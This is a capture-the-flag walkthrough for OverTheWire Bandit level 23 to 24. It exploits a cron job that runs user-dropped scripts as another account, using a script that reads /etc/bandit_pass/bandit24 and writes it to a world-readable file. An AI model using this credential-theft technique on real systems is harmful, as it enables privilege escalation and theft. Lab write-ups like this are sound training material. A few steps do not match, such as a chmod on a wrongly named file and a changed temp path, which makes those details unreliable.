## Bandit Level 23 → 24

### Login

```bash
ssh -p 2220 bandit23@bandit.labs.overthewire.org
```
Password: [password2223]

---

### Description

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in `/etc/cron.d/` for the configuration and see what command is being executed.

---

### Theory

This level introduces bash scripting and emphasizes understanding Unix file and directory permissions.

#

### Steps

```bash
bandit23@bandit:~$ ls -la /etc/cron.d
total 36
drwxr-xr-x  2 root root 4096 Jul 11  2020 .
drwxr-xr-x 87 root root 4096 May 14  2020 ..
-rw-r--r--  1 root root   62 May 14  2020 cronjob_bandit15_root
-rw-r--r--  1 root root   62 Jul 11  2020 cronjob_bandit17_root
-rw-r--r--  1 root root  120 May  7  2020 cronjob_bandit22
-rw-r--r--  1 root root  122 May  7  2020 cronjob_bandit23
-rw-r--r--  1 root root  120 May 14  2020 cronjob_bandit24
-rw-r--r--  1 root root   62 May 14  2020 cronjob_bandit25_root
-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
```

```bash
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

```bash
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash
shopt -s nullglob
myname=$(whoami)

cd /var/spool/"$myname"/foo || exit
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
```

* The script runs as **bandit24**, so `myname` = `bandit24` -> changes directory to `/var/spool/bandit24`.
* It iterates over all files, including hidden ones (except `.` and `..`)
* If a file is **owned by bandit23**, it is executed (with a 60‑second timeout).
* Regardless of execution, the file is then deleted.

#

Create a script **(owned by bandit23)** that will be executed as **bandit24** by the cron job.

#

```bash
bandit23@bandit:~$ mktemp -d
/tmp/tmp.jM8r8g1SvP
bandit23@bandit:~$ cd /tmp/tmp.jM8r8g1SvP
bandit23@bandit:/tmp/tmp.jM8r8g1SvP$ chmod 777 /tmp/tmp.jM8r8g1SvP
```

* Necessary folder permission modification to ensure that when the cron job runs as **bandit24**, they will have permissions to send to this temp directory.
* Directory to be copied to must be **writable** by bandit24 (and executable if bandit24 is not the directory owner) (777 for example)

```bash
bandit23@bandit:/tmp/tmp.jM8r8g1SvP$ nano pass.sh
```
#
`pass.sh`:

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.jM8r8g1SvP/password
chmod 744 /tmp/tmp.jM8r8g1SvP/password
```
* This script reads the **bandit24** password to a file we have access to and makes it **readable** by other users.
#


```bash
bandit23@bandit:/tmp/tmp.jM8r8g1SvP$ chmod 755 bandit24_pass.sh
```
* `pass.sh` needs to be **readable and executable** by bandit24 (755 for example)

```bash
cp pass.sh /var/spool/bandit24/foo/
```
#
Sanity check
* NOTE: Cannot tab complete `pass.sh` as we do not have proper permissions for `/var/spool/bandit24/foo/`.
```bash
bandit23@bandit:/tmp/tmp.jM8r8g1SvP$ cat /var/spool/bandit24/foo/pass.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.yunUI4swMy/password
chmod 744 /tmp/tmp.yunUI4swMy/password
```

* NOTE: Must wait til cronjob runs `pass.sh` which can be checked by using `ls` within the tempdir and seeing the `password` file or by running the sanity check again and seeing

```bash
cat: /var/spool/bandit24/foo/pass.sh: No such file or directory
```
#
Output password
```bash
bandit23@bandit:/tmp/tmp.jM8r8g1SvP$ cat password
[password2324]
```
#


[OverTheWire Bandit Level 23 -> 24](https://overthewire.org/wargames/bandit/bandit24.html)
